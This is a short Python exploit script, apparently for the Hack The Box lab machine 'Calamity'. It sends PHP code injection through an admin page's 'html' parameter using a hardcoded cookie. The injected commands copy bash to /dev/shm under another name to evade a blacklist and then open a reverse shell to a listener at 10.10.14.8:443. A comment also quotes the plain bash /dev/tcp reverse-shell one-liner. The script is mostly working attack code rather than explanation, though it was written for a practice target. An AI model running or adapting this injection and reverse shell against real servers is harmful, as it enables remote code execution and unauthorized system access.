#!/usr/bin/python3

# This is an autopwn python script for HTB Calamity. Credit goes to S4vitar on Live
# Usage: Use nano to change LHOST and LPORT >>> Set up your Listener: nc -nlvp 443 >>> To execute: python3 autoPwn_calamityv1.py

import sys
import pdb # Debugging
import requests
import signal
import threading

def def_handler(sig, frame):
    print("\n\n[!] Exiting the autopwn_calamity script...\n")
    sys.exit(1)

# CTRL + C
signal.signal(signal.SIGINT, def_handler)

# Global Variables
main_url = "http://10.10.10.27/admin.php"
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
def makeRequest():
    headers = {
        'Cookie': 'adminpowa=noonecares'
    }
    r = requests.get(main_url + "?html=<?php%20system(\"cp%20/bin/bash%20/dev/shm/foo\");%20?>", headers=headers)
    r = requests.get(main_url + "?html=<?php%20system(\"chmod%20+x%20/dev/shm/foo\");%20?>", headers=headers)
    r = requests.get(main_url + "?html=<?php%20system(\"/dev/shm/foo%20-c%20'/dev/shm/foo%20-i%20>%26%20/dev/tcp/10.10.14.8/443%200>%261'\");%20?>", headers=headers, proxies=proxies)
    print(r.text)
# Normally this would work but bash is blacklisted >>> <?php system(\"bash -c 'bash -i >& /dev/tcp/10.10.X.X/443 0>&1'\"); ?>
# So we will have to copy /bin/bash to /dev/shm and name it something else & then execute it. 

if __name__ == '__main__':
    #time.sleep(5)
    makeRequest()
